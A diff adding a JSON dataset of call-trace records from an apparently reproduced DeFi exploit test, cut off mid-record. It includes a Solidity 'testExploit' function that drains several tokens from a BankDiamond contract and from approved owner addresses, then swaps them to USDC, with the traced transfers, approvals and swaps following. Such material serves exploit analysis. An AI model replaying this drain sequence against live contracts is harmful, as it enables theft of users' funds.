@@ -1,0 +1,1031 @@
+[
+    {
+        "id": "1594215",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Attacker USDC Balance Before exploit\", IERC20(USDC_TOKEN).balanceOf(address(this)), 6\n        );\n\n        // Transfer tokens from BankDiamond to the attacker\n        transferTokens(USDC_TOKEN);\n        transferTokens(ARB_TOKEN);\n        transferTokens(LINK_TOKEN);\n        transferTokens(WSTETH_TOKEN);\n        transferTokens(WETH_TOKEN);\n        transferTokens(ARB_USDC_TOEKN);\n\n        // TransferFrom tokens from owners to the attacker\n        transferFromOwner(0x512E07A093aAA20Ba288392EaDF03838C7a4e522, USDC_TOKEN);\n        transferFromOwner(0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290, USDC_TOKEN);\n        transferFromOwner(0x7b782A4D552a8ceB3924005a786a1a358BA63f71, WSTETH_TOKEN);\n\n        // Swap tokens to USDC using UniV3Router\n        swapTokens(ARB_TOKEN);\n        swapTokens(LINK_TOKEN);\n        swapTokens(WSTETH_TOKEN);\n        swapTokens(WETH_TOKEN);\n        swapTokens(ARB_USDC_TOEKN);\n\n        // Log balances after exploit\n        emit log_named_decimal_uint(\n            \"Attacker USDC Balance After exploit\", IERC20(USDC_TOKEN).balanceOf(address(this)), 6\n        );\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function simulates an attack scenario where an attacker transfers multiple types of tokens from a target (referred to as `BankDiamond`) and specific owners to their own address. After transferring the tokens, the attacker swaps them for USDC (a stablecoin) using a decentralized exchange router (UniV3Router). The function logs the attacker's USDC balance before and after the exploit to track the impact of the attack.\n\n2. **Security mechanism**:  \n   The function does not explicitly include security measures or modifiers. Instead, it appears to be a testing or demonstration function that simulates an exploit. In a real-world scenario, such actions would require proper authorization checks (e.g., `onlyOwner` or `require` statements) to prevent unauthorized access or misuse. The absence of these checks in this function highlights the importance of implementing robust security mechanisms in production code.\n\n3. **Parameter Function**:  \n   The function does not take any parameters directly. However, it relies on predefined token addresses (e.g., `USDC_TOKEN`, `ARB_TOKEN`) and owner addresses (e.g., `0x512E07A093aAA20Ba288392EaDF03838C7a4e522`) to perform the token transfers and swaps. These addresses are hardcoded into the function, indicating that the function is tailored to a specific scenario or test case.\n\n4. **Return description**:  \n   The function does not return any value. Instead, it emits log events to display the attacker's USDC balance before and after the exploit. These logs serve as a way to track the changes in the attacker's balance and measure the success of the simulated exploit.\n\n**In summary**,  \nThe `testExploit` function is a simulation of an attack where an attacker transfers and swaps multiple tokens to accumulate USDC. It logs the attacker's USDC balance before and after the exploit to demonstrate the impact. The function lacks security mechanisms, making it suitable only for testing or demonstration purposes. It relies on hardcoded token and owner addresses to perform its operations and does not return any value, instead using logs to display results.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "9750",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2553",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3250",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "10375584869 [1.037e10]"
+    },
+    {
+        "id": "2553",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "10375584869 [1.037e10]"
+    },
+    {
+        "id": "99459",
+        "args": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000026a6edc65",
+        "original_code": "    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n\n    /// @notice Increase the maximum number of price and liquidity observations that this pool will store\n    /// @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n    /// the input observationCardinalityNext.\n    /// @param observationCardinalityNext The desired minimum number of observations for the pool to store\n",
+        "description": "1. Core functions:  \nThe `flash` function is designed to allow a recipient to borrow a specified amount of two tokens (`amount0` and `amount1`) temporarily. This is typically used in decentralized finance (DeFi) for flash loans, where the borrowed funds must be returned within the same transaction. The `data` parameter can be used to pass additional information or instructions for the recipient to execute during the loan.  \n\nThe second function increases the maximum number of price and liquidity observations that the pool can store. This helps the pool maintain a more accurate history of price and liquidity changes, which is useful for tracking and analyzing market behavior. If the pool already has a sufficient number of observations, this function does nothing.\n\n2. Security mechanism:  \nFor the `flash` function, the key security measure is ensuring that the borrowed amounts are returned within the same transaction. This is typically enforced by the smart contract logic, which checks that the loan is repaid before the transaction ends.  \n\nFor the observation function, the security mechanism is a simple check to ensure that the requested number of observations (`observationCardinalityNext`) is greater than the current capacity. If not, the function does nothing, preventing unnecessary changes to the pool's configuration.\n\n3. Parameter Function:  \n- `recipient`: The address of the entity that will receive the borrowed tokens.  \n- `amount0`: The amount of the first token to borrow.  \n- `amount1`: The amount of the second token to borrow.  \n- `data`: Additional data or instructions for the recipient to execute during the loan.  \n- `observationCardinalityNext`: The desired minimum number of observations the pool should store.  \n\n4. Return description:  \nNeither function returns a value. The `flash` function executes the loan and expects the recipient to return the borrowed amounts within the same transaction. The observation function updates the pool's observation capacity if necessary, but it does not produce an output.  \n\nIn summary,  \nThe `flash` function enables temporary borrowing of tokens for use within a single transaction, while the observation function adjusts the pool's capacity to store price and liquidity data. Both functions include checks to ensure proper execution and security.",
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "94198",
+        "args": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000026a6edc65",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "31621",
+        "args": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "30063",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10375584869 [1.037e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "29363",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10375584869 [1.037e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2913",
+        "args": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "9820",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "2478235540754361715555 [2.478e21]"
+    },
+    {
+        "id": "2580",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "2478235540754361715555 [2.478e21]"
+    },
+    {
+        "id": "67651",
+        "args": "0x912CE59144191C1204E64559FE8253a0e49E6548, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000086586d4e0fbbd38b63",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "66890",
+        "args": "0x912CE59144191C1204E64559FE8253a0e49E6548, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000086586d4e0fbbd38b63",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "27621",
+        "args": "0x912CE59144191C1204E64559FE8253a0e49E6548, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "33155",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2478235540754361715555 [2.478e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "32412",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2478235540754361715555 [2.478e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2913",
+        "args": "0x912CE59144191C1204E64559FE8253a0e49E6548, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "12602",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "69669705859926416088 [6.966e19]"
+    },
+    {
+        "id": "2337",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x3f770Ac673856F105b586bb393d122721265aD46"
+    },
+    {
+        "id": "2465",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "69669705859926416088 [6.966e19]"
+    },
+    {
+        "id": "63723",
+        "args": "0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000003c6dc845a8add5ad8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "62962",
+        "args": "0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000003c6dc845a8add5ad8",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "27621",
+        "args": "0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "29227",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 69669705859926416088 [6.966e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "337",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x3f770Ac673856F105b586bb393d122721265aD46"
+    },
+    {
+        "id": "28087",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 69669705859926416088 [6.966e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2913",
+        "args": "0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "7577",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "266618989782460718 [2.666e17]"
+    },
+    {
+        "id": "2530",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "266618989782460718 [2.666e17]"
+    },
+    {
+        "id": "62933",
+        "args": "0x5979D7b546E38E414F7E9822514be443A4800529, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000003b3388f005b692e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "62172",
+        "args": "0x5979D7b546E38E414F7E9822514be443A4800529, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000003b3388f005b692e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "27621",
+        "args": "0x5979D7b546E38E414F7E9822514be443A4800529, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "28437",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 266618989782460718 [2.666e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "27866",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 266618989782460718 [2.666e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2913",
+        "args": "0x5979D7b546E38E414F7E9822514be443A4800529, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "9796",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "287173939050505854 [2.871e17]"
+    },
+    {
+        "id": "2553",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "287173939050505854 [2.871e17]"
+    },
+    {
+        "id": "63396",
+        "args": "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000003fc3f2d11dae67e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "62635",
+        "args": "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000003fc3f2d11dae67e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "27621",
+        "args": "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "28900",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 287173939050505854 [2.871e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "28154",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 287173939050505854 [2.871e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2913",
+        "args": "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "9796",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "300000000 [3e8]"
+    },
+    {
+        "id": "2553",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "300000000 [3e8]"
+    },
+    {
+        "id": "69893",
+        "args": "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000011e1a300",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "69132",
+        "args": "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000011e1a300",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "27621",
+        "args": "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "35397",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 300000000 [3e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "34651",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 300000000 [3e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2913",
+        "args": "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 340282366920938463463374607431768211456 [3.402e38]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1250",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3359",
+        "args": "0x512E07A093aAA20Ba288392EaDF03838C7a4e522, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007903129639935 [1.157e77]"
+    },
+    {
+        "id": "2659",
+        "args": "0x512E07A093aAA20Ba288392EaDF03838C7a4e522, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007903129639935 [1.157e77]"
+    },
+    {
+        "id": "1250",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3359",
+        "args": "0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "1000000000 [1e9]"
+    },
+    {
+        "id": "2659",
+        "args": "0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "1000000000 [1e9]"
+    },
+    {
+        "id": "1077",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "530",
+        "args": "0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3306",
+        "args": "0x7b782A4D552a8ceB3924005a786a1a358BA63f71, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "2735",
+        "args": "0x7b782A4D552a8ceB3924005a786a1a358BA63f71, 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]"
+    },
+    {
+        "id": "1320",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2478235540754361715555 [2.478e21]"
+    },
+    {
+        "id": "580",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2478235540754361715555 [2.478e21]"
+    },
+    {
+        "id": "25348",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 2478235540754361715555 [2.478e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24626",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 2478235540754361715555 [2.478e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "109000",
+        "args": "ExactInputSingleParams({ tokenIn: 0x912CE59144191C1204E64559FE8253a0e49E6548, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 2478235540754361715555 [2.478e21], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "2792982688 [2.792e9]"
+    },
+    {
+        "id": "101568",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 2478235540754361715555 [2.478e21], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b912ce59144191c1204e64559fe8253a0e49e6548000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "2478235540754361715555 [2.478e21], -2792982688 [-2.792e9]"
+    },
+    {
+        "id": "10163",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2792982688 [2.792e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9463",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2792982688 [2.792e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3320",
+        "args": "0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3",
+        "original_code": null,
+        "description": null,
+        "return_value": "155732704212549553908299 [1.557e23]"
+    },
+    {
+        "id": "2580",
+        "args": "0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3",
+        "original_code": null,
+        "description": null,
+        "return_value": "155732704212549553908299 [1.557e23]"
+    },
+    {
+        "id": "15915",
+        "args": "2478235540754361715555 [2.478e21], -2792982688 [-2.792e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002b912ce59144191c1204e64559fe8253a0e49e6548000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "11859",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3, 2478235540754361715555 [2.478e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "11131",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3, 2478235540754361715555 [2.478e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1320",
+        "args": "0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3",
+        "original_code": null,
+        "description": null,
+        "return_value": "158210939753303915623854 [1.582e23]"
+    },
+    {
+        "id": "580",
+        "args": "0xaEBDcA1Bc8d89177EbE2308d62af5e74885DcCc3",
+        "original_code": null,
+        "description": null,
+        "return_value": "158210939753303915623854 [1.582e23]"
+    },
+    {
+        "id": "1602",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "69669705859926416088 [6.966e19]"
+    },
+    {
+        "id": "337",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x3f770Ac673856F105b586bb393d122721265aD46"
+    },
+    {
+        "id": "465",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "69669705859926416088 [6.966e19]"
+    },
+    {
+        "id": "25702",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 69669705859926416088 [6.966e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "337",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x3f770Ac673856F105b586bb393d122721265aD46"
+    },
+    {
+        "id": "24562",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 69669705859926416088 [6.966e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "106336",
+        "args": "ExactInputSingleParams({ tokenIn: 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831, fee: 3000, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1713616643 [1.713e9], amountIn: 69669705859926416088 [6.966e19], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }",
+        "original_code": null,
+        "description": null,
+        "return_value": "974896474 [9.748e8]"
+    },
+    {
+        "id": "98875",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 69669705859926416088 [6.966e19], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bf97f4df75117a78c1a5a0dbb814af92458539fb4000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "-974896474 [-9.748e8], 69669705859926416088 [6.966e19]"
+    },
+    {
+        "id": "10163",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 974896474 [9.748e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "9463",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 974896474 [9.748e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3602",
+        "args": "0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "6288389870288120312932 [6.288e21]"
+    },
+    {
+        "id": "337",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x3f770Ac673856F105b586bb393d122721265aD46"
+    },
+    {
+        "id": "2465",
+        "args": "0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "6288389870288120312932 [6.288e21]"
+    },
+    {
+        "id": "14157",
+        "args": "-974896474 [-9.748e8], 69669705859926416088 [6.966e19], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bf97f4df75117a78c1a5a0dbb814af92458539fb4000bb8af88d065e77c8cc2239327c5edb3a432268e5831000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "10071",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e, 69669705859926416088 [6.966e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "337",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x3f770Ac673856F105b586bb393d122721265aD46"
+    },
+    {
+        "id": "8928",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e, 69669705859926416088 [6.966e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1602",
+        "args": "0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "6358059576148046729020 [6.358e21]"
+    },
+    {
+        "id": "337",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x3f770Ac673856F105b586bb393d122721265aD46"
+    },
+    {
+        "id": "465",
+        "args": "0xbBe36e6f0331C6a36AB44Bc8421E28E1a1871C1e",
+        "original_code": null,
+        "description": null,
+        "return_value": "6358059576148046729020 [6.358e21]"
+    },
+    {
+        "id": "1077",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "266618989782460718 [2.666e17]"
+    },
+    {
+        "id": "530",
+        "args": "Rico: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "266618989782460718 [2.666e17]"
+    },
+    {
+        "id": "25155",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 266618989782460718 [2.666e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "24605",
+        "args": "0xE592427A0AEce92De3Edee1F18E0157C05861564, 266618989782460718 [2.666e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "130500",
